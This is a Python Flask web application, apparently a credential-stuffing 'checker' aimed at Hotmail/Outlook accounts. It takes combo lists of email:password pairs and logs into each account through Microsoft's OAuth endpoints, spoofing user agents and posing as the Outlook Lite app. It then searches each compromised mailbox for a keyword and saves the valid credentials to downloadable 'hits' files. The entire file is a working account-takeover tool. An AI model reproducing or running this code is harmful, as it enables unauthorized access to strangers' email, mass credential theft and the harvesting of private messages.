import os
import uuid
import json
import re
import threading
import time
import requests
from flask import Flask, render_template, request, send_file
from flask_socketio import SocketIO
from user_agent import generate_user_agent

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

# Eredmények mentése (Renderen ideiglenes!)
RESULTS_DIR = "results"
if not os.path.exists(RESULTS_DIR):
    os.makedirs(RESULTS_DIR)

class HotmailWebWorker:
    def __init__(self, combo_list, keyword, sid):
        self.combo_list = combo_list
        self.keyword = keyword
        self.sid = sid
        self.hits_file = os.path.join(RESULTS_DIR, f"hits_{sid}.txt")
        self.custom_file = os.path.join(RESULTS_DIR, f"custom_{sid}.txt")
        self.stats = {"hits": 0, "bad": 0, "custom": 0, "retries": 0}

    def log(self, msg, mtype):
        socketio.emit('new_log', {'msg': msg, 'type': mtype}, room=self.sid)

    def update_ui(self):
        socketio.emit('stats_update', self.stats, room=self.sid)

    def run(self):
        for line in self.combo_list:
            line = line.strip()
            if not line or '@' not in line or ':' not in line: continue
            
            email, password = line.split(':', 1)
            retries = 0
            # Eredeti logika: szinte végtelen retry, de weben limitáljuk 5-re a stabilitásért
            while retries < 5:
                session = requests.Session()
                try:
                    user_agent = generate_user_agent()
                    # --- AUTH INDÍTÁS ---
                    url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                    
                    headers = {
                        "User-Agent": user_agent,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                        "client-request-id": str(uuid.uuid4()),
                        "X-Requested-With": "com.microsoft.outlooklite"
                    }
                    
                    res = session.get(url, headers=headers, timeout=30)
                    
                    # PPFT és urlPost kinyerése (Eredeti regexek)
                    ppft = ""
                    url_post = ""
                    
                    sd_match = re.search(r'var ServerData = ({.*?});', res.text, re.DOTALL)
                    if sd_match:
                        try:
                            sd = json.loads(sd_match.group(1))
                            sFTTag = sd.get('sFTTag', '')
                            if sFTTag:
                                pm = re.search(r'value="([^"]+)"', sFTTag)
                                if pm: ppft = pm.group(1)
                            url_post = sd.get('urlPost', '')
                        except: pass

                    if not ppft:
                        pm = re.search(r'name="PPFT" value="([^"]+)"', res.text)
                        if pm: ppft = pm.group(1)
                    
                    if not url_post:
                        um = re.search(r'"urlPost":"([^"]+)"', res.text)
                        if um: url_post = um.group(1)

                    if not ppft or not url_post:
                        raise Exception("PPFT_ERROR")

                    # --- LOGIN POST ---
                    data_str = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=Passport&NewUser=1&i19=3772"
                    
                    post_headers = {
                        "User-Agent": user_agent,
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Origin": "https://login.live.com",
                        "Referer": res.url,
                        "X-Requested-With": "com.microsoft.outlooklite"
                    }
                    
                    login_res = session.post(url_post, data=data_str, headers=post_headers, allow_redirects=False, timeout=30)

                    if "__Host-MSAAUTHP" not in session.cookies.get_dict():
                        self.stats["bad"] += 1
                        self.log(f"[BAD] {email}", "bad")
                        break # Következő combo

                    # --- TOKEN ÉS KERESÉS ---
                    auth_code = ""
                    loc = login_res.headers.get('Location', '')
                    if 'code=' in loc:
                        auth_code = loc.split('code=')[1].split('&')[0]
                    
                    access_token = ""
                    if auth_code:
                        t_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
                        t_data = {
                            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                            "grant_type": "authorization_code",
                            "code": auth_code,
                            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
                        }
                        tr = requests.post(t_url, data=t_data, timeout=30).json()
                        access_token = tr.get("access_token", "")

                    if access_token:
                        # Keresés a kulcsszóra (Eredeti Search Payload)
                        search_url = "https://outlook.live.com/search/api/v2/query"
                        search_payload = {
                            "EntityRequests": [{
                                "EntityType": "Conversation",
                                "Query": {"QueryString": self.keyword},
                                "Size": 25
                            }]
                        }
                        s_headers = {
                            "Authorization": f"Bearer {access_token}",
                            "Content-Type": "application/json",
                            "User-Agent": "Outlook-Android/2.0"
                        }
                        
                        sr = requests.post(search_url, json=search_payload, headers=s_headers, timeout=30).json()
                        
                        # Találatok ellenőrzése
                        try:
                            total = sr['EntityRequests'][0]['Result']['Total']
                        except:
                            total = 0

                        if int(total) > 0:
                            self.stats["hits"] += 1
                            save_line = f"{email}:{password} | Mails: {total}"
                            with open(self.hits_file, "a") as f: f.write(save_line + "\n")
                            self.log(f"[HIT] {email} | Találat: {total}", "hit")
                        else:
                            self.stats["custom"] += 1
                            with open(self.custom_file, "a") as f: f.write(f"{email}:{password}\n")
                            self.log(f"[OK] {email} | Nincs találat", "custom")
                    
                    success = True
                    break # Sikeresen végzett ezzel az emaillel

                except Exception as e:
                    retries += 1
                    self.stats["retries"] += 1
                    time.sleep(1)

            self.update_ui()
        
        socketio.emit('finished', {}, room=self.sid)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/download/<ftype>/<sid>')
def download(ftype, sid):
    path = os.path.join(RESULTS_DIR, f"{ftype}_{sid}.txt")
    return send_file(path, as_attachment=True) if os.path.exists(path) else ("Nincs fájl", 404)

@socketio.on('start_check')
def handle_start(data):
    worker = HotmailWebWorker(data['combo'].splitlines(), data['keyword'], request.sid)
    threading.Thread(target=worker.run).start()

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host='0.0.0.0', port=port)
